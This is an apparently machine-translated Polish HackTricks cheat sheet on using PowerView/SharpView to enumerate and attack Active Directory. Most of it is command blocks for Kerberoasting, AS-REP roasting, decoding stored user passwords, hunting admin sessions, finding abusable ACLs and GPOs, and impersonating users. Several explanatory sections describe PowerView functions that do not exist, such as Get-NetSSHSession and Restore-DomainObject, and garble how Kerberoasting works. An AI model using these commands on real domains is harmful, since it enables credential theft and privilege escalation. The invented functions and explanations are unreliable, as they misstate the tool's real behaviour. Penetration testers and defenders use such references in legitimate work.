# PowerView/SharpView

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujcej si cyberbezpieczestwem**? Chcesz zobaczy swoj **firm reklamowan w HackTricks**? A mo偶e chcesz mie dostp do **najnowszej wersji PEASS lub pobra HackTricks w formacie PDF**? Sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Docz do** [****](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Najbardziej aktualna wersja PowerView zawsze bdzie znajdowa si w gazi dev PowerSploit: [https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

[**SharpView**](https://github.com/tevora-threat/SharpView) to port .NET [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

### Szybka enumeracja
```powershell
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl
```
### Informacje o domenie

#### Get-Domain
```powershell
Get-Domain
```
Polecenie `Get-Domain` zwraca informacje o bie偶cej domenie, takie jak nazwa domeny, SID (Security Identifier), GUID (Globally Unique Identifier) i inne szczeg贸y.

#### Get-DomainController
```powershell
Get-DomainController
```
Polecenie `Get-DomainController` zwraca informacje o kontrolerach domeny, takie jak nazwa, adres IP, nazwa domeny i inne szczeg贸y.

#### Get-DomainPolicy
```powershell
Get-DomainPolicy
```
Polecenie `Get-DomainPolicy` zwraca informacje o politykach domeny, takie jak nazwa, opis, ustawienia i inne szczeg贸y.

#### Get-DomainTrust
```powershell
Get-DomainTrust
```
Polecenie `Get-DomainTrust` zwraca informacje o zaufaniu midzy domenami, takie jak nazwa domeny, typ zaufania, kierunek i inne szczeg贸y.

#### Get-DomainUser
```powershell
Get-DomainUser
```
Polecenie `Get-DomainUser` zwraca informacje o u偶ytkownikach domeny, takie jak nazwa, SID, GUID, grupy, waciwoci konta i inne szczeg贸y.
```powershell
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info
Get-ForestDomain
```
### U偶ytkownicy, Grupy, Komputery i OU

PowerView dostarcza wiele przydatnych funkcji do zarzdzania u偶ytkownikami, grupami, komputerami i jednostkami organizacyjnymi (OU) w rodowisku Windows. Poni偶ej przedstawiam kilka przykad贸w u偶ycia tych funkcji:

#### U偶ytkownicy

- `Get-NetUser`: Pobiera informacje o u偶ytkownikach w domenie.
- `Get-NetUser -Username <username>`: Pobiera informacje o konkretnym u偶ytkowniku.
- `Get-NetUser -Filter <filter>`: Pobiera u偶ytkownik贸w speniajcych okrelone kryteria.
- `Get-NetUser -Domain <domain>`: Pobiera u偶ytkownik贸w z okrelonej domeny.

#### Grupy

- `Get-NetGroup`: Pobiera informacje o grupach w domenie.
- `Get-NetGroup -GroupName <groupname>`: Pobiera informacje o konkretnej grupie.
- `Get-NetGroup -Filter <filter>`: Pobiera grupy speniajce okrelone kryteria.
- `Get-NetGroup -Domain <domain>`: Pobiera grupy z okrelonej domeny.

#### Komputery

- `Get-NetComputer`: Pobiera informacje o komputerach w domenie.
- `Get-NetComputer -ComputerName <computername>`: Pobiera informacje o konkretnym komputerze.
- `Get-NetComputer -Filter <filter>`: Pobiera komputery speniajce okrelone kryteria.
- `Get-NetComputer -Domain <domain>`: Pobiera komputery z okrelonej domeny.

#### Jednostki organizacyjne (OU)

- `Get-NetOU`: Pobiera informacje o jednostkach organizacyjnych w domenie.
- `Get-NetOU -OUName <ouname>`: Pobiera informacje o konkretnej jednostce organizacyjnej.
- `Get-NetOU -Filter <filter>`: Pobiera jednostki organizacyjne speniajce okrelone kryteria.
- `Get-NetOU -Domain <domain>`: Pobiera jednostki organizacyjne z okrelonej domeny.

Te funkcje mog by przydatne podczas przeprowadzania test贸w penetracyjnych, aby uzyska informacje o u偶ytkownikach, grupach, komputerach i jednostkach organizacyjnych w celu identyfikacji potencjalnych saboci i atak贸w.
```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```
### Logowanie i sesje

PowerView dostarcza kilka przydatnych funkcji do zarzdzania logowaniem i sesjami w systemie Windows.

#### Pobieranie informacji o logowaniu

Aby uzyska informacje o logowaniu u偶ytkownik贸w w danym systemie, mo偶emy u偶y funkcji `Get-NetLoggedon`. Ta funkcja zwraca list u偶ytkownik贸w, kt贸rzy s obecnie zalogowani na danym komputerze.

```powershell
Get-NetLoggedon
```

#### Pobieranie informacji o sesjach

Aby uzyska informacje o aktywnych sesjach w systemie, mo偶emy u偶y funkcji `Get-NetSession`. Ta funkcja zwraca list aktywnych sesji wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetSession
```

#### Pobieranie informacji o sesjach SMB

Aby uzyska informacje o aktywnych sesjach SMB w systemie, mo偶emy u偶y funkcji `Get-NetSMBSession`. Ta funkcja zwraca list aktywnych sesji SMB wraz z informacjami o u偶ytkownikach, komputerach, nazwach udzia贸w i czasie rozpoczcia sesji.

```powershell
Get-NetSMBSession
```

#### Pobieranie informacji o sesjach RDP

Aby uzyska informacje o aktywnych sesjach RDP w systemie, mo偶emy u偶y funkcji `Get-NetRDPSession`. Ta funkcja zwraca list aktywnych sesji RDP wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetRDPSession
```

#### Pobieranie informacji o sesjach WinRM

Aby uzyska informacje o aktywnych sesjach WinRM w systemie, mo偶emy u偶y funkcji `Get-NetWinRMSession`. Ta funkcja zwraca list aktywnych sesji WinRM wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetWinRMSession
```

#### Pobieranie informacji o sesjach PowerShell

Aby uzyska informacje o aktywnych sesjach PowerShell w systemie, mo偶emy u偶y funkcji `Get-NetPowerShellSession`. Ta funkcja zwraca list aktywnych sesji PowerShell wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetPowerShellSession
```

#### Pobieranie informacji o sesjach DCOM

Aby uzyska informacje o aktywnych sesjach DCOM w systemie, mo偶emy u偶y funkcji `Get-NetDCOMSession`. Ta funkcja zwraca list aktywnych sesji DCOM wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetDCOMSession
```

#### Pobieranie informacji o sesjach WMI

Aby uzyska informacje o aktywnych sesjach WMI w systemie, mo偶emy u偶y funkcji `Get-NetWmiSession`. Ta funkcja zwraca list aktywnych sesji WMI wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetWmiSession
```

#### Pobieranie informacji o sesjach WSMan

Aby uzyska informacje o aktywnych sesjach WSMan w systemie, mo偶emy u偶y funkcji `Get-NetWSManSession`. Ta funkcja zwraca list aktywnych sesji WSMan wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetWSManSession
```

#### Pobieranie informacji o sesjach SSH

Aby uzyska informacje o aktywnych sesjach SSH w systemie, mo偶emy u偶y funkcji `Get-NetSSHSession`. Ta funkcja zwraca list aktywnych sesji SSH wraz z informacjami o u偶ytkownikach, komputerach i czasie rozpoczcia sesji.

```powershell
Get-NetSSHSession
```
```powershell
Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
Get-LoggedOnLocal -ComputerName <servername> #Get locally logon users at the moment (need remote registry (default in server OS))
Get-LastLoggedon -ComputerName <servername> #Get last user logged on (needs admin rigths in host)
Get-NetRDPSession -ComputerName <servername> #List RDP sessions inside a host (needs admin rights in host)
```
### Obiekt zasad grupy - GPO

Jeli atakujcy ma **wysokie uprawnienia w GPO**, mo偶e wykorzysta je do **przywilej贸w podwy偶szonych** poprzez **dodanie uprawnie dla u偶ytkownika**, **dodanie lokalnego administratora** do hosta lub **utworzenie zaplanowanego zadania** (natychmiastowego) w celu wykonania okrelonej czynnoci.\
Aby uzyska [**wicej informacji na ten temat i jak go wykorzysta, kliknij tutaj**](../active-directory-methodology/acl-persistence-abuse/#gpo-delegation).
```powershell
#GPO
Get-DomainGPO | select displayName #Check the names for info
Get-NetGPO #Get all policies with details
Get-NetGPO | select displayname #Get the names of the policies
Get-NetGPO -ComputerName <servername> #Get the policy applied in a computer
gpresult /V #Get current policy

# Get who can create new GPOs
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=invented,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

# Get permissions a user/group has over any GPO
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# COnvert GPO GUID to name
Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532

# Transform SID to name
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126

# Get GPO of an OU
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'

# Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType

# Enumerates the machines where a specific domain user/group is a member of a specific local group.
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```
Naucz si, jak **wykorzysta uprawnienia w GPO i ACL** w:

{% content-ref url="../active-directory-methodology/acl-persistence-abuse/" %}
[acl-persistence-abuse](../active-directory-methodology/acl-persistence-abuse/)
{% endcontent-ref %}

### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### Udostpnione pliki i foldery

PowerView provides several functions to enumerate shared files and folders on a target system. These functions can be useful for gathering information during a penetration test or security assessment.

#### Get-NetShare

The `Get-NetShare` function retrieves information about shared folders on a target system. It returns the share name, local path, and description for each shared folder.

```powershell
Get-NetShare
```

#### Get-NetLoggedon

The `Get-NetLoggedon` function enumerates users who are currently logged on to a target system. It can be used to identify users who have accessed shared files or folders.

```powershell
Get-NetLoggedon
```

#### Get-NetSession

The `Get-NetSession` function retrieves information about active sessions on a target system. It can be used to identify users who are currently connected to shared files or folders.

```powershell
Get-NetSession
```

#### Get-NetFile

The `Get-NetFile` function enumerates open files on a target system. It can be used to identify files that are currently being accessed by users.

```powershell
Get-NetFile
```

#### Get-NetFileServer

The `Get-NetFileServer` function retrieves information about file servers on a target system. It returns the server name, share name, and number of open files for each file server.

```powershell
Get-NetFileServer
```

#### Get-NetFileShare

The `Get-NetFileShare` function retrieves information about file shares on a target system. It returns the share name, local path, and number of open files for each file share.

```powershell
Get-NetFileShare
```

By using these functions, you can gather valuable information about shared files and folders on a target system, which can help in identifying potential security vulnerabilities or misconfigurations.
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### Zaufanie domeny

Domain Trust (zaufanie domeny) to mechanizm w systemie Windows, kt贸ry umo偶liwia jednej domenie zaufanie drugiej domenie. Za pomoc zaufania domenowego mo偶na udostpni zasoby i usugi midzy r贸偶nymi domenami w sieci. Zaufanie domeny mo偶e by jednostronne lub dwustronne, co oznacza, 偶e jedna domena mo偶e zaufa drugiej, ale druga domena nie musi zaufa pierwszej.

Zaufanie domeny mo偶e by przydatne w celu umo偶liwienia u偶ytkownikom z jednej domeny dostpu do zasob贸w w innej domenie, takich jak pliki, drukarki, usugi sieciowe itp. Mo偶e r贸wnie偶 uatwi zarzdzanie kontami u偶ytkownik贸w i uprawnieniami w r贸偶nych domenach.

W celu ustanowienia zaufania domenowego, administrator musi skonfigurowa odpowiednie ustawienia w systemie Windows. Istnieje kilka typ贸w zaufania domenowego, takich jak zaufanie jednokierunkowe, zaufanie dwukierunkowe, zaufanie lene itp. Ka偶dy typ ma swoje wasne zastosowanie i wymagania konfiguracyjne.

Podsumowujc, zaufanie domeny jest mechanizmem, kt贸ry umo偶liwia komunikacj i udostpnianie zasob贸w midzy r贸偶nymi domenami w sieci Windows. Jest to przydatne narzdzie zarzdzania i umo偶liwiania dostpu do zasob贸w w rodowiskach wielodomenowych.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### Niskowiszce owoce

Niskowiszce owoce to proste i atwe do wykorzystania podatnoci, kt贸re s czsto ignorowane lub niedoceniane przez administrator贸w system贸w. Wykorzystanie tych podatnoci mo偶e umo偶liwi atakujcemu zdobycie dostpu do systemu lub uzyskanie wra偶liwych informacji. Poni偶ej przedstawiam kilka przykad贸w niskowiszcych owoc贸w, kt贸re mo偶na wykorzysta w celach pentestowych:

#### Sabe hasa u偶ytkownik贸w

Wielu u偶ytkownik贸w nadal u偶ywa sabych hase, takich jak "password" lub "123456". Atakujcy mo偶e wykorzysta te sabe hasa, aby uzyska dostp do kont u偶ytkownik贸w.

#### Nieaktualne oprogramowanie

Nieaktualne oprogramowanie czsto zawiera znane podatnoci, kt贸re mog by wykorzystane przez atakujcych. Administratorzy powinni regularnie aktualizowa oprogramowanie, aby zapobiec wykorzystaniu tych podatnoci.

#### Brak zabezpiecze

Wiele system贸w nie ma odpowiednich zabezpiecze, takich jak silne hasa, ograniczenia dostpu czy monitorowanie log贸w. Atakujcy mo偶e wykorzysta te braki w zabezpieczeniach, aby uzyska nieautoryzowany dostp.

#### Nieprawidowe konfiguracje

Nieprawidowe konfiguracje system贸w mog prowadzi do wystpienia podatnoci. Przykadowo, niewaciwie skonfigurowane uprawnienia plik贸w lub bdne ustawienia serwera mog umo偶liwi atakujcemu uzyskanie dostpu do systemu.

#### Sabe zarzdzanie u偶ytkownikami

Niewaciwe zarzdzanie u偶ytkownikami, takie jak nadawanie zbyt du偶ych uprawnie lub brak regularnego usuwania nieaktywnych kont, mo偶e prowadzi do podatnoci. Atakujcy mo偶e wykorzysta te sabe zarzdzanie, aby uzyska dostp do kont u偶ytkownik贸w.

Wykorzystanie niskowiszcych owoc贸w jest czsto pierwszym krokiem w procesie penetrowania systemu. Atakujcy powinien zawsze rozwa偶y wykorzystanie tych podatnoci, poniewa偶 mog one by atwe do wykorzystania i mog prowadzi do dalszych atak贸w.
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### Usunite obiekty

W systemie Active Directory istnieje mo偶liwo przywracania usunitych obiekt贸w, kt贸re zostay przypadkowo lub celowo usunite. Powerview dostarcza kilka przydatnych funkcji do odzyskiwania takich obiekt贸w.

#### Get-DomainObject

Polecenie `Get-DomainObject` pozwala na wyszukiwanie usunitych obiekt贸w w domenie. Mo偶na je filtrowa na podstawie r贸偶nych atrybut贸w, takich jak nazwa, SID, GUID, typ obiektu itp.

```powershell
Get-DomainObject -Deleted
```

#### Restore-DomainObject

Polecenie `Restore-DomainObject` su偶y do przywracania usunitych obiekt贸w. Wymaga podania identyfikatora obiektu, kt贸ry mo偶na uzyska za pomoc polecenia `Get-DomainObject`.

```powershell
Restore-DomainObject -Identity <objectIdentity>
```

#### Remove-DomainObject

Polecenie `Remove-DomainObject` su偶y do trwaego usunicia obiekt贸w z systemu Active Directory. Mo偶e by u偶ywane do usunicia obiekt贸w, kt贸re zostay przywr贸cone za pomoc polecenia `Restore-DomainObject`.

```powershell
Remove-DomainObject -Identity <objectIdentity>
```

#### Przykad u偶ycia

Poni偶ej przedstawiony jest przykad u偶ycia powy偶szych polece w celu odzyskania i usunicia obiektu u偶ytkownika o nazwie "JohnDoe".

```powershell
$deletedUser = Get-DomainObject -Deleted | Where-Object {$_.SamAccountName -eq "JohnDoe"}
Restore-DomainObject -Identity $deletedUser.DistinguishedName
Remove-DomainObject -Identity $deletedUser.DistinguishedName
```

W powy偶szym przykadzie najpierw wyszukujemy usunitego u偶ytkownika o nazwie "JohnDoe" za pomoc polecenia `Get-DomainObject`. Nastpnie przywracamy ten obiekt za pomoc polecenia `Restore-DomainObject`. Na koniec usuwamy go trwale za pomoc polecenia `Remove-DomainObject`.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### MISC

#### SID na Nazw

```powershell
ConvertFrom-SID -SID <SID>
```

Konwertuje identyfikator zabezpiecze (SID) na nazw konta w systemie Windows.

#### Name to SID

```powershell
ConvertTo-SID -Name <Name>
```

Konwertuje nazw konta na identyfikator zabezpiecze (SID) w systemie Windows.

#### Get Current User SID

```powershell
(Get-ADUser -Identity $env:USERNAME).SID.Value
```

Pobiera identyfikator zabezpiecze (SID) bie偶cego u偶ytkownika w systemie Windows.
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
#### Kerberoast

Kerberoast to technika ataku, kt贸ra polega na wykorzystaniu sabych hase u偶ytkownik贸w w celu uzyskania ich skr贸conych hase Kerberos. Skr贸cone hasa Kerberos s przechowywane w formie skr贸conych hase usugowych (Service Principal Names - SPN) w Active Directory. Atakujcy mo偶e wykorzysta narzdzie PowerView, aby zidentyfikowa konta u偶ytkownik贸w, kt贸re maj skr贸cone hasa Kerberos, a nastpnie u偶y narzdzia Rubeus do ich zamania. Po zamaniu skr贸conego hasa Kerberos, atakujcy mo偶e uzyska dostp do konta u偶ytkownika i wykona dalsze dziaania.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### U偶yj innych powiadcze (argument)

To use different credentials when running PowerShell commands, you can use the `-Credential` parameter. This allows you to specify a different set of credentials to be used for the command execution. 

For example, if you want to run a command as a different user, you can use the following syntax:

```powershell
Get-Process -Credential (Get-Credential)
```

This will prompt you to enter the username and password for the desired user. Once entered, the command will be executed using the provided credentials.

Keep in mind that you need appropriate permissions to use different credentials. Additionally, be cautious when using this feature, as it can potentially expose sensitive information if not used properly.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### Udawanie u偶ytkownika

To udawanie u偶ytkownika w PowerShellu mo偶na osign za pomoc polecenia `Invoke-UserImpersonation`. Polecenie to wymaga uprawnie administratora i pozwala na zmian kontekstu u偶ytkownika na dowolne konto w domenie. Oto skadnia polecenia:

```powershell
Invoke-UserImpersonation -Username <username> -Domain <domain> -Password <password>
```

Gdzie:
- `<username>` to nazwa u偶ytkownika, kt贸rego chcemy udawa,
- `<domain>` to nazwa domeny, w kt贸rej znajduje si konto u偶ytkownika,
- `<password>` to haso u偶ytkownika.

Po wykonaniu polecenia, bie偶cy kontekst u偶ytkownika zostanie zmieniony na konto, kt贸re chcemy udawa.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
